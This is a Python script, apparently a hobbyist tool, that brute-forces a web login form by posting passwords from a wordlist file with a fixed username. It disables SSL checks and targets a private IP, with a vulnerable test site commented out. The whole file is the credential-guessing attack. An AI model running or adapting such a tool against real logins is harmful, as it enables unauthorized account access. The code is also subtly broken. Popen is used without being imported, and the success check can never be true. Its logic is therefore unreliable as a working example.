#!/usr/bin/env python3

import requests, subprocess
import time, re

Popen("start msedge " + "file:///D:/projects/python-projects/password_guesser/content_file.html", shell=True)  # windows command

def get_post_requests(url, user_data):
    # Modify the code here as per requirement
    # create code specific to the webpage

    session = requests.Session()                                              # with "Session" request same as browser
    response = session.get(url, verify=False)                                 # verify=false , so no to verify ssl certificate if its invalid
    
    login_url = re.search('(?:action=")(.*login)', response.content.decode())
    if login_url:
        login_url = login_url.group(1)
        login_url = url + login_url

    response = session.post(login_url, data=user_data, verify=False)
    if "authentication failed" in response.content.decode():
        return False
        
# def open_in_browser(response_content):                                         # funciton just for fixing bugs, not used in cracking
#     with open("content_file.html", "wb") as out_file:
#         out_file.write(response_content)
#     subprocess.

# main code
# url = "http://testphp.vulnweb.com/userinfo.php"
url = "https://172.17.236.1"
user_data = {"user": "_26734", "pass": "test", "Login": "submit"}           # for user and password {"name":"value",} , for button {value:type}
wordlist_file = "passwords.txt"
try:
    # opens the WORDLIST file to access the passwords 
    with open(wordlist_file, 'r') as wordlist_file:
        for line in wordlist_file:
            word=line.strip()
            user_data["pass"] = word
            success = get_post_requests(url, user_data)
            if not success:
                print("\rChecked word " + word, end="", flush=True)
                # time.sleep(1)
                continue
            else: 
                print("\n[+] Password Found !")
                break
        print("\n[-] Password not found........ in wordlist")
except FileNotFoundError as error:
    print(str(error))
except KeyboardInterrupt:
    print("\n[+] Ctrl + C detected .........Exiting")


